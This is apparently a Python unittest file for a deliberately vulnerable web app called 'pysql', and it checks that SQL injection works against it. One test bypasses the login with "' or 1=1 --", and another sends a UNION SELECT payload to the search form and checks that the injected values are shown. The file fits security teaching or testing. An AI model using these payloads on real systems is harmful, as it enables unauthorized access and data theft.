import os
import pysql
import unittest
import tempfile
from pysql.config import DATABASE
from pysql.db import init_db

class AuthTestCase(unittest.TestCase):

    def setUp(self):
        DATABASE = ':memory:'
        pysql.app.config['TESTING'] = True
        self.app = pysql.app.test_client()
        with pysql.app.app_context():
            init_db(pysql.app)

    def login(self, login, password):
        return self.app.post('/login', data=dict(
            login=login,
            password=password
        ), follow_redirects=True)

    def select_sqli_test(self):
        rv = self.login("' or 1=1 --", "doesn't matter")
        assert b'Search' in rv.data

    def union_sqli_test(self):
        self.select_sqli_test()
        payload = dict(q="' union select 1, 1, 1, 1 --")
        rv = self.app.post('/', data=payload)
        assert b"<b>Id:</b> 1, <b>Username:</b> 1, <b>Age:</b> 1, <b>Login:</b> 1" in rv.data